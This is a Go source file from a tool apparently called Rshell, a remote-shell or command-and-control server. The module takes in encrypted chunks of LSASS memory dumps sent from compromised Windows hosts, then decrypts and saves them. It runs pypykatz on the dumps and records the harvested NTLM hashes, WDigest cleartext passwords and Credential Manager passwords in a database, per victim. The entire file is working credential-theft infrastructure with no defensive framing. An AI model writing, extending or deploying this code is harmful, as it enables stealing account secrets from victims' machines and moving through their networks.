package database

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"sync"
	"time"

	"Rshell/pkg/logger"
)

type dumpState struct {
	key       string
	encrypted []byte
}

var (
	dumpStates   = make(map[string]*dumpState)
	dumpStatesMu sync.Mutex
)
const dumpBaseDir = "Downloads"

func HasPypykatz() bool {
	_, err := exec.LookPath("pypykatz")
	return err == nil
}

func HandleDumpData(uid string, data []byte) {
	if len(data) == 0 {
		return
	}
	msgType := data[0]
	payload := data[1:]

	switch msgType {
	case 1: // key
		key := string(payload)
		dumpStatesMu.Lock()
		dumpStates[uid] = &dumpState{key: key}
		dumpStatesMu.Unlock()
		logger.Infof("[dump] KEY received for %s", uid)

	case 2: // data chunk
		dumpStatesMu.Lock()
		if state, ok := dumpStates[uid]; ok {
			state.encrypted = append(state.encrypted, payload...)
		}
		dumpStatesMu.Unlock()

	case 3: // done
		dumpStatesMu.Lock()
		state, exists := dumpStates[uid]
		if exists {
			delete(dumpStates, uid)
		}
		dumpStatesMu.Unlock()
		if !exists || state.key == "" || len(state.encrypted) < 100 {
			logger.Infof("[dump] Invalid dump state for %s", uid)
			return
		}
		logger.Infof("[dump] All chunks received for %s (%d bytes total), decrypting...", uid, len(state.encrypted))
		decryptAndParse(uid, state.encrypted, state.key)
	}
}

func decryptAndParse(uid string, encrypted []byte, keyB64 string) {
	key, err := base64.StdEncoding.DecodeString(keyB64)
	if err != nil {
		logger.Infof("[dump] Invalid key for %s: %v", uid, err)
		return
	}
	if len(encrypted) < 12 {
		logger.Infof("[dump] Encrypted data too short for %s", uid)
		return
	}

	nonce := encrypted[:12]
	ciphertext := encrypted[12:]
	block, _ := aes.NewCipher(key)
	aesgcm, _ := cipher.NewGCM(block)
	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		logger.Infof("[dump] Decrypt failed for %s: %v", uid, err)
		return
	}
	logger.Infof("[dump] Decrypted %d bytes for %s", len(plaintext), uid)

	dumpDir := filepath.Join(dumpBaseDir, uid)
	os.MkdirAll(dumpDir, 0755)
	fileName := fmt.Sprintf("lsass_dump_%d.dmp", time.Now().Unix())
	filePath := filepath.Join(dumpDir, fileName)
	os.WriteFile(filePath, plaintext, 0644)

	Engine.Insert(&CredentialDumps{
		Uid: uid, FileName: fileName, FilePath: filePath,
		FileSize: int64(len(plaintext)), CreatedAt: time.Now().Unix(),
	})
	logger.Infof("[dump] Dump saved: %s (%d bytes)", filePath, len(plaintext))

	// Run pypykatz to parse
	count := runPypykatz(uid, filePath)
	logger.Infof("[dump] Completed for %s: %d credentials extracted", uid, count)
}

func runPypykatz(uid, dumpPath string) int {
	logger.Infof("[dump] Running pypykatz on %s...", dumpPath)

	cmd := exec.Command("pypykatz", "lsa", "minidump", dumpPath, "--json")
	output, err := cmd.Output()
	if err != nil {
		logger.Infof("[dump] pypykatz failed for %s: %v", uid, err)
		if exitErr, ok := err.(*exec.ExitError); ok {
			logger.Infof("[dump] pypykatz stderr: %s", string(exitErr.Stderr))
		}
		return 0
	}

	var rawResult map[string]pypykatzFileResult
	if err := json.Unmarshal(output, &rawResult); err != nil {
		logger.Infof("[dump] pypykatz JSON parse failed for %s: %v", uid, err)
		logger.Infof("[dump] Raw output: %s", string(output[:min(500, len(output))]))
		return 0
	}

	var count int
	for dumpPath, fileResult := range rawResult {
		_ = dumpPath
		for luid, session := range fileResult.LogonSessions {
			logger.Infof("[dump] Session %s: %s\\%s", luid, session.Domainname, session.Username)

			// MSV - NTLM hashes
			for _, cred := range session.MsvCreds {
				if cred.Username != "" || cred.Domainname != "" {
					secret := cred.NThash
					if secret == "" {
						secret = cred.SHAHash
					}
					if !credentialExists(uid, cred.Username, cred.Domainname, secret) {
						Engine.Insert(&Credentials{
							Uid: uid, Target: cred.Domainname,
							Username: cred.Username, Secret: secret,
							CredType: "hash", Source: "lsass_msv",
							CreatedAt: time.Now().Unix(),
						})
						count++
					}
				}
			}

			// WDigest - cleartext passwords
			for _, cred := range session.WdigestCreds {
				if cred.Username != "" && cred.Password != "" && cred.Password != "None" {
					if !credentialExists(uid, cred.Username, cred.Domainname, cred.Password) {
						Engine.Insert(&Credentials{
							Uid: uid, Target: cred.Domainname,
							Username: cred.Username, Secret: cred.Password,
							CredType: "password", Source: "lsass_wdigest",
							CreatedAt: time.Now().Unix(),
						})
						count++
					}
				}
			}

			// CREDMAN - saved credentials (passwords)
			for _, cred := range session.CredmanCreds {
				if cred.Username != "" && cred.Password != "" && cred.Password != "None" {
					if !credentialExists(uid, cred.Username, cred.Domainname, cred.Password) {
						Engine.Insert(&Credentials{
							Uid: uid, Target: cred.Domainname,
							Username: cred.Username, Secret: cred.Password,
							CredType: "password", Source: "lsass_credman",
							CreatedAt: time.Now().Unix(),
						})
						count++
					}
				}
			}
		}
	}

	logger.Infof("[dump] pypykatz extracted %d credentials for %s", count, uid)

	// Append result to shell output
	var shell Shell
	if _, err := Engine.Where("uid = ?", uid).Get(&shell); err == nil {
		msg := fmt.Sprintf("[mimikatz] Dump parsed: %d credentials found (MSV/WDigest/CREDMAN)", count)
		shell.ShellContent += msg
		Engine.Where("uid = ?", uid).Update(&shell)
	}

	return count
}

type pypykatzFileResult struct {
	LogonSessions map[string]pypykatzSession `json:"logon_sessions"`
}

type pypykatzSession struct {
	Domainname   string          `json:"domainname"`
	Username     string          `json:"username"`
	MsvCreds     []pypykatzCred  `json:"msv_creds"`
	WdigestCreds []pypykatzCred  `json:"wdigest_creds"`
	CredmanCreds []pypykatzCred  `json:"credman_creds"`
}

type pypykatzCred struct {
	Domainname string `json:"domainname"`
	Username   string `json:"username"`
	Password   string `json:"password"`
	NThash     string `json:"NThash"`
	SHAHash    string `json:"SHAHash"`
}

func credentialExists(uid, username, target, secret string) bool {
	var c Credentials
	exists, _ := Engine.Where("uid = ? AND username = ? AND target = ? AND secret = ?",
		uid, username, target, secret).Get(&c)
	return exists
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
